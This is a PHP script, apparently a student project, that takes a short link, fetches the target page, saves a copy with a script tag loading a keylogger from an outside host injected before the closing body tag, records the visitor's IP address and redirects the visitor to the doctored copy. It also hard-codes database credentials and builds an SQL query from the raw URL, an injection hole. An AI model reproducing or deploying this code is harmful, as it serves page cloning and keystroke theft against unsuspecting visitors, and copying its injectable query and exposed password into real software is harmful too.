<?php>
include('../php/simple_html_dom.php');

$servername = "mysql.hostinger.co.uk";
$username = "u697075009_user";
$password = "yTanyR";
$dbname = "u697075009_data";

$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}



$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$key = substr($actual_link , 34, strlen($actual_link));

$sql = "SELECT longlink FROM DATA WHERE shortlink='{$key}'";

$result = $conn->query($sql);
$arrayOfResults = mysqli_fetch_row($result);
$link = $arrayOfResults[0];

$conn->close();

$identifier = substr($key , 0 , 5);
$htmlFileName = $identifier.".html";
$html=fopen($htmlFileName, "w");
fwrite($html , file_get_contents("$link"));
/*foreach($html->find('img#src') as $element){
		$imgName = $element->innertext;
		$img = file_get_contents($link."/".$imgName);	
	}

}    */
fclose($html);


$keyloggerscript = "http://finalyearproject.pe.hu/js/keylogger.js";
$textToInsert="script src='$keyloggerscript'></script>";
$contents = file_get_contents("$htmlFileName");
$newContent = preg_replace("</body>", $textToInsert."</body", $contents);    
file_put_contents($htmlFileName, $newContent);




$ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');

echo $ip;

$data = fopen("data.txt" , "w");
fwrite($data ,"\n"."$ip"." says: ");
fclose($data);
header("Location:".$htmlFileName, true, 303);

die();

?>
